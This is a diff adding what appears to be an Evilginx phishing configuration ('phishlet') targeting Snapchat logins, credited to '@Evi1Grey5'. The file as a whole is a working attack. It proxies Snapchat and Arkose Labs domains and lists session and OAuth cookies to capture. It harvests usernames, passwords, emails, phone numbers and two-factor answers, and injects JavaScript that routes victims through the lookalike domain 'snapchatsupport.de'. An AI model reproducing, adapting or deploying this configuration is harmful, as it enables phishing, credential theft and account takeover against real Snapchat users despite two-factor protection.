@@ -1,0 +1,125 @@
+
+author: '@Evi1Grey5'
+min_ver: '3.3.0'
+
+proxy_hosts:
+  - {phish_sub: 'accounts', orig_sub: 'accounts', domain: 'snapchat.com', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: '', orig_sub: '', domain: 'snapchat.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'snapchat.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'csp-central', orig_sub: 'csp-central', domain: 'appspot.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'us-central1-gcp', orig_sub: 'us-central1-gcp', domain: 'api.snapchat.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'gcp', orig_sub: 'gcp', domain: 'api.snapchat.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'aws', orig_sub: 'aws', domain: 'api.snapchat.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'static', orig_sub: 'static', domain: 'snapchat.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'snap-api', orig_sub: 'snap-api', domain: 'arkoselabs.com', session: true, is_landing: false, auto_filter: true}
+
+  # us-central1-gcp.api.snapchat.com
+  # gcp.api.snapchat.com
+  # aws.api.snapchat.com
+  # accounts.snapchat.com
+  # static.snapchat.com
+  # iframe.arkoselabs.com
+  # graphql.contentful.com
+  # story.snapchat.com
+  # snap-api.arkoselabs.com
+  # tr.snapchat.com
+  # sc-static.net
+
+sub_filters:
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'accounts', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'www', domain: 'snapchat.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'accounts.snapchat.com', orig_sub: 'csp-central', domain: 'appspot.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+
+auth_tokens:
+  # Main Snapchat domain
+  - domain: 'snapchat.com'
+    keys: ['session', 'auth', 'xsrf', 'sc-nt', 'sc-at', 'csrftoken', 'scs', 'sc_sid', 'secure_session_id']
+
+  # Snapchat's OAuth and API interactions (SnapKit)
+  - domain: 'snapkit.snapchat.com'
+    keys: ['session', 'auth', 'xsrf', 'sc-nt', 'sc-at', 'csrftoken', 'oauth_token', 'oauth_secret']
+
+  # Google's App Engine for Snapchat's security and policy handling
+  - domain: 'appspot.com'
+    keys: ['session', 'auth', 'xsrf', 'sc-nt', 'sc-at', 'csrftoken']
+
+  # Static assets or other services (typically doesn't carry important tokens, but included for completeness)
+  - domain: 'assets.snapchat.com'
+    keys: []
+
+  # Possible mobile subdomains or additional service domains
+  - domain: 'm.snapchat.com'
+    keys: ['session', 'auth', 'xsrf', 'sc-nt', 'sc-at', 'csrftoken', 'scs', 'sc_sid', 'secure_session_id']
+  - domain: 'ads.snapchat.com'
+    keys: ['session', 'auth', 'xsrf', 'sc-nt', 'sc-at', 'csrftoken']
+
+
+auth_urls:
+  - "/v2/welcome" 
+  - "^/v2/welcome/$"
+
+
+credentials:
+  username:
+    key: "accountIdentifier"
+    search: "(.*)"
+    type: "post"
+  password:
+    key: "password"
+    search: "(.*)"
+    type: "post"
+  custom:
+    - key: "email"
+      search: "email\":\"(.*?)\""
+      type: "post"
+    - key: 'ai_token'
+      search: "(.*)"
+      type: 'post'
+    - key: 'twoFAChallengeAnswer'
+      search: "(.*)"
+      type: 'post'
+    - key: 'accountIdentifierCountryCode'
+      search: "(.*)"
+      type: 'post'
+    - key: 'accountIdentifierPhoneNumber'
+      search: "(.*)"
+      type: 'post'
+
+
+js_inject:
+  - trigger_domains: ["www.snapchatsupport.de"]
+    trigger_paths: ["/v2/welcome"]
+    script: |
+      function handleLogin() {
+        // Check if login was successful
+        if (window.location.pathname === "/v2/welcome") {
+          // Redirect to intermediate URL to capture tokens
+          window.location.href = "https://accounts.snapchatsupport.de/v2/welcome";
+        }
+      }
+
+      // Trigger the handleLogin function
+      setTimeout(handleLogin, 1000); // Adjust the delay if needed
+      
+      // Optionally, you could handle the redirection on the intermediate page
+      // This part needs to be added to the intermediate page?s JavaScript
+      if (window.location.hostname === "accounts.snapchatsupport.de") {
+        setTimeout(function() {
+          window.location.href = "https://accounts.snapchat.com/accounts/v2/login";
+        }, 3000); // Adjust the delay as needed
+      }
+
+
+login:
+  domain: "accounts.snapchat.com"
+  path: "/accounts/v2/login"
+
+
+redirect_url: 'https://accounts.snapchat.com/accounts/v2/login'  
